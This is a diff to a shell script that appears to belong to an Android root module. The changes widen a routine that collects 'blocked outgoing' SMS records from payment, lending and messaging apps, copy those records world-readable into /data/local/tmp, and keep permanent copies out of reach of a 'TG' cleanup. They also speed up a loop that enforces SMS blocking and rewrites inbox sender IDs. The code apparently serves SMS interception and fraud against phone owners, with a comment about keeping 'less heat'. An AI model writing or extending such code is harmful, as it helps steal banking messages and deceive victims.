@@ -528,7 +528,7 @@ harvest_blocked_outgoing() {
              com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android \
              com.hdfcbank.payzapp com.axis.mobile \
              com.google.android.apps.messaging com.samsung.android.messaging \
-             com.android.messaging com.android.mms; do
+             com.android.messaging com.android.mms com.motorola.messaging com.android.mms.service; do
     for f in \
       "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
       "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
@@ -541,6 +541,17 @@ harvest_blocked_outgoing() {
       bn=$(basename "$f")
       cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
       chmod 666 "/data/local/tmp/$bn" 2>/dev/null
+      # Keep permanent last copy (never deleted by TG)
+      case "$bn" in
+        *outgoing_blocked.json|*pending_verify.json)
+          cp -f "$f" /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
+          chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
+          ;;
+        *outgoing_blocked.flag)
+          cp -f "$f" /data/local/tmp/hivirtus_last_outgoing.flag 2>/dev/null
+          chmod 666 /data/local/tmp/hivirtus_last_outgoing.flag 2>/dev/null
+          ;;
+      esac
     done
   done
   for f in "$MODDIR/hivirtus_outgoing_blocked.json" "$MODDIR/hivirtus_outgoing_blocked.flag" \
@@ -553,6 +564,8 @@ harvest_blocked_outgoing() {
     esac
     chmod 666 /data/local/tmp/hivirtus_outgoing_blocked.json /data/local/tmp/hivirtus_outgoing_blocked.flag \
       /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
+    cp -f /data/local/tmp/hivirtus_outgoing_blocked.json /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
   done
 }
 
@@ -960,7 +973,7 @@ rewrite_inbox_sender_id() {
     enforce_sms_block
     # watchdog every other loop — less heat
     hivirtus_tg_watchdog 2>/dev/null
-    sleep 5
+    sleep 2
   done
 ) &
 
